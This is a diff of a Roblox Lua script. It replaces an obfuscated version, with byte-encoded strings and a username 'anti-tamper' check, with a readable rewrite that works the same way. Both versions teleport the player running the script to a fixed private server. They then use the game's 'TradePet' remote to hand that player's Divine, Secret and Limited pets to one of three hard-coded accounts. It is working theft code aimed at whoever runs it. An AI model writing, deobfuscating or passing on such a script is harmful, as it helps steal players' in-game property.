@@ -1,55 +1,58 @@
 repeat wait() until game:IsLoaded()
 
-local a = game
-local b = a:GetService("\080\108\097\121\101\114\115")
-local c = a:GetService("\084\101\108\101\112\111\114\116\083\101\114\118\105\099\101")
-local d = a:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101")
-local e = b.LocalPlayer
+-- Services
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- Optional anti-tamper (change or remove as needed)
-if e.Name ~= "\066\111\115\115\069\120\097\109\112\108\101" then return end
+-- Player
+local player = Players.LocalPlayer
 
-local f = 126884695634066
-local g = "19fa2ffd5b2f404494bc8c791a60c706"
+-- Game & Server ID
+local gameID = 126884695634066
+local privateServerID = "19fa2ffd5b2f404494bc8c791a60c706"
 
+-- Teleport to private server
 pcall(function()
-	c:TeleportToPrivateServer(f, g, {e})
+    TeleportService:TeleportToPrivateServer(gameID, privateServerID, {player})
 end)
 
-e.CharacterAdded:Wait()
+-- Wait until player loads in again
+player.CharacterAdded:Wait()
 repeat wait() until game:IsLoaded()
 wait(5)
 
-local h = {"\068\105\118\105\110\101", "\083\101\099\114\101\116", "\076\105\109\105\116\101\100"}
-for i = 1, #h do
-	h[i] = string.char(unpack({string.byte(h[i], 1, #h[i])}))
-end
-local j = string.char(unpack({string.byte("\082\097\114\105\116\121", 1, 6)}))
+-- Target rarities
+local targetRarities = { "Divine", "Secret", "Limited" }
+local rarityKey = "Rarity"
 
-local k = {
-	string.char(unpack({98,111,110,101,98,108,111,115,115,111,109,50,49,53})),
-	string.char(unpack({98,101,97,110,115,116,97,108,107,49,50,53,49})),
-	string.char(unpack({98,117,114,110,105,110,103,98,117,100,55,48,57}))
+-- Target users to send pets to (if they're online)
+local preferredUsers = {
+    "boneblossom215",
+    "beanstalk1251",
+    "burningbud709"
 }
 
-local l = nil
-for m = 1, #k do
-	if b:FindFirstChild(k[m]) then
-		l = k[m]
-		break
-	end
+-- Find one of the users online
+local targetUser = nil
+for _, name in ipairs(preferredUsers) do
+    if Players:FindFirstChild(name) then
+        targetUser = name
+        break
+    end
 end
-if not l then return end
 
-local n = d:FindFirstChild(string.char(unpack({84,114,97,100,101,80,101,116})))
-if not n then return end
+-- Find the trade remote
+local tradeRemote = ReplicatedStorage:FindFirstChild("TradePet")
 
-local o = e:FindFirstChild("Pets")
-if not o then return end
-
-for _, p in pairs(o:GetChildren()) do
-	local q = p:FindFirstChild(j)
-	if q and table.find(h, q.Value) then
-		n:FireServer(l, p.Name)
-	end
+-- Find and send pets
+if targetUser and tradeRemote and player:FindFirstChild("Pets") then
+    for _, pet in ipairs(player.Pets:GetChildren()) do
+        local rarity = pet:FindFirstChild(rarityKey)
+        if rarity and table.find(targetRarities, rarity.Value) then
+            tradeRemote:FireServer(targetUser, pet.Name)
+        end
+    end
+else
+    warn("❌ Missing target user, TradePet remote, or Pets folder.")
 end
